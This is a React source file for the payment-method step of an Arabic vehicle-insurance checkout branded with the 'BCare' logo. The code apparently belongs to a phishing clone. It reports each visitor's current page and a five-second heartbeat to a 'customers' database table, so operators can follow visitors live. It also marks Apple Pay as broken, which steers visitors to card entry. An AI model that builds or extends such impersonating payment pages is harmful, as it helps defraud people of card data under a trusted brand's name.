import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "./PaymentMethod.css";
import Footer from "../../components/Footer/Footer";
import { supabase } from "../../supabase";
import { PolicyModal } from "../../components/PolicyModal/PolicyModal";

export const PaymentMethod = ({ className, ...props }) => {
  const navigate = useNavigate();
  const [paymentType, setPaymentType] = useState('card');
  const [error, setError] = useState('');
  const [isPolicyModalOpen, setIsPolicyModalOpen] = useState(false);
  const [customerData, setCustomerData] = useState({});

  // Update Page Tracking & Heartbeat
  useEffect(() => {
    const customerId = sessionStorage.getItem('customerId');
    if (customerId) {
      // Track Page
      supabase.from('customers').update({ 
        page: '4- طريقه الدفع',
        status: 'idle',
        last_update: Date.now(),
        last_heartbeat: Date.now()
      }).eq('id', customerId).then(({ error }) => { if (error) console.error("Update Error:", error) });

      // Fetch Data for Modal
      const fetchData = async () => {
        const { data, error } = await supabase
          .from('customers')
          .select('*')
          .eq('id', customerId)
          .single();
        
        if (data && !error) {
          setCustomerData(data);
        }
      };
      fetchData();
    }

    const interval = setInterval(() => {
      const id = sessionStorage.getItem('customerId');
      if (id) {
        supabase.from('customers').update({ 
          last_heartbeat: Date.now() 
        }).eq('id', id).then(() => {});
      }
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  const handleContinue = async () => {
    if (paymentType === 'apple') {
      setError('عذراً، خدمة Apple Pay غير متاحة حالياً. يرجى اختيار وسيلة دفع أخرى.');
    } else {
      setError('');
      const customerId = sessionStorage.getItem('customerId');
      if (customerId) {
        supabase.from('customers').update({
          payment_method: 'card',
          last_update: new Date().getTime(),
          last_heartbeat: new Date().getTime()
        }).eq('id', customerId).then(({ error }) => { if (error) console.error(error) });
      }
      navigate('/payment');
    }
  };

  return (
    <div className={`payment-page ${className || ""}`}>
      {/* Header */}
      <header className="site-header">
        <div className="header-right">
          <div className="user-icon">
            <img src="/svg0.svg" alt="User" />
          </div>
        </div>
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
        <div className="header-left">
          <span className="lang-toggle">EN</span>
        </div>
      </header>

      <main className="payment-main">
        {/* Progress Stepper */}
        <div className="stepper-container">
          <div className="step completed">
            <div className="step-number">1</div>
            <div className="step-label">البيانات الرئيسية</div>
          </div>
          <div className="step-line active"></div>
          <div className="step completed">
            <div className="step-number">2</div>
            <div className="step-label">تفاصيل وثيقة التأمين</div>
          </div>
          <div className="step-line active"></div>
          <div className="step completed">
            <div className="step-number">3</div>
            <div className="step-label">الشركات والعروض</div>
          </div>
          <div className="step-line active"></div>
          <div className="step active">
            <div className="step-number">4</div>
            <div className="step-label">الملخص والدفع</div>
          </div>
        </div>

        <div className="payment-content-grid">
          {/* Main Column */}
          <div className="payment-main-col">
            {/* Service Details Card */}
            <section className="payment-card">
              <div className="card-header">
                <img src="/svg0.svg" alt="" className="card-icon" />
                <h2 className="card-title">تفاصيل الخدمة</h2>
              </div>
              <div className="details-list">
                <div className="detail-row">
                  <span className="detail-label">شركة التأمين</span>
                  <span className="detail-value">{sessionStorage.getItem('selectedCompany') || 'تكافل الراجحي'}</span>
                </div>
                <div className="detail-row">
                  <span className="detail-label">نوع التأمين</span>
                  <span className="detail-value">تأمين مركبات</span>
                </div>
                <div className="detail-row">
                  <span className="detail-label">رسوم التأمين</span>
                  <span className="detail-value">{(parseFloat(sessionStorage.getItem('totalPrice')) / 1.15).toFixed(2)} ر.س</span>
                </div>
                <div className="detail-row">
                  <span className="detail-label">ضريبة القيمة المضافة (15%)</span>
                  <span className="detail-value">{(parseFloat(sessionStorage.getItem('totalPrice')) * 0.1304).toFixed(2)} ر.س</span>
                </div>
                <div className="detail-row total">
                  <span className="detail-label">المجموع الكلي</span>
                  <span className="detail-value">{sessionStorage.getItem('totalPrice') || '688.85'} ر.س</span>
                </div>
              </div>
              <button className="preview-doc-btn btn-glow" onClick={() => setIsPolicyModalOpen(true)}>
                معاينة وثيقة التأمين
                <img src="/svg1.svg" alt="" />
              </button>
            </section>

            <PolicyModal 
              isOpen={isPolicyModalOpen} 
              onClose={() => setIsPolicyModalOpen(false)} 
              data={{
                ...customerData,
                selectedCompany: sessionStorage.getItem('selectedCompany'),
                totalPrice: sessionStorage.getItem('totalPrice')
              }} 
            />

            {/* Payment Method Selection Card */}
            <section className="payment-card">
              <div className="card-header">
                <img src="/svg2.svg" alt="" className="card-icon" />
                <h2 className="card-title">طريقة الدفع</h2>
              </div>
              <div className="payment-options">
                <label className={`payment-option ${paymentType === 'card' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="payment" 
                    checked={paymentType === 'card'} 
                    onChange={() => setPaymentType('card')} 
                  />
                  <div className="option-info">
                    <span className="option-name">بطاقة ائتمان / مدى</span>
                    <span className="option-desc">Visa, Mastercard, مدى</span>
                  </div>
                  <img src="/svg3.svg" alt="Card" className="option-icon" />
                </label>

                <label className={`payment-option ${paymentType === 'apple' ? 'active' : ''}`}>
                  <input 
                    type="radio" 
                    name="payment" 
                    checked={paymentType === 'apple'} 
                    onChange={() => setPaymentType('apple')} 
                  />
                  <div className="option-info">
                    <span className="option-name">Apple Pay</span>
                    <span className="option-desc">الدفع بواسطة Apple Pay</span>
                  </div>
                  <img src="/svg4.svg" alt="Apple Pay" className="option-icon" />
                </label>

                {paymentType === 'apple' && (
                  <div className="apple-pay-disabled-msg">
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
                    <span>عذراً، خدمة Apple Pay معطلة حالياً للإصلاح، يرجى استخدام بطاقة مدى أو الفيزا.</span>
                  </div>
                )}
              </div>
            </section>
          </div>

          {/* Sidebar Column (Order Summary) */}
          <aside className="payment-sidebar">
            <div className="summary-card">
              <div className="summary-header">
                <h2 className="summary-title">ملخص الطلب</h2>
              </div>
              <div className="summary-body">
                <div className="summary-row">
                  <span className="summary-label">الشركة</span>
                  <span className="summary-value">{sessionStorage.getItem('selectedCompany') || 'تكافل الراجحي'}</span>
                </div>
                <div className="summary-row">
                  <span className="summary-label">نوع التأمين</span>
                  <span className="summary-value">تأمين مركبات</span>
                </div>
                <div className="summary-row">
                  <span className="summary-label">الرسوم</span>
                  <span className="summary-value">{(parseFloat(sessionStorage.getItem('totalPrice')) / 1.15).toFixed(2)} ر.س</span>
                </div>
                <div className="summary-row">
                  <span className="summary-label">الضريبة</span>
                  <span className="summary-value">{(parseFloat(sessionStorage.getItem('totalPrice')) * 0.1304).toFixed(2)} ر.س</span>
                </div>
                <hr className="summary-divider" />
                <div className="summary-row grand-total">
                  <span className="summary-label">المجموع</span>
                  <span className="summary-value">{sessionStorage.getItem('totalPrice') || '688.85'} ر.س</span>
                </div>
                
                {error && <div className="payment-error-msg">{error}</div>}
                
                <button 
                  className={`confirm-pay-btn main-action-btn ${paymentType === 'apple' ? 'disabled-btn' : ''}`} 
                  onClick={handleContinue}
                  disabled={paymentType === 'apple'}
                >
                  متابعة الدفع
                  <img src="/svg5.svg" alt="" />
                </button>
                
                <p className="terms-text">
                  بالضغط على متابعة الدفع، أنت توافق على 
                  <a href="#"> شروط الخدمة </a> و <a href="#"> سياسة الخصوصية </a>
                </p>
              </div>
            </div>
          </aside>
        </div>
      </main>

      <Footer />
    </div>
  );
};
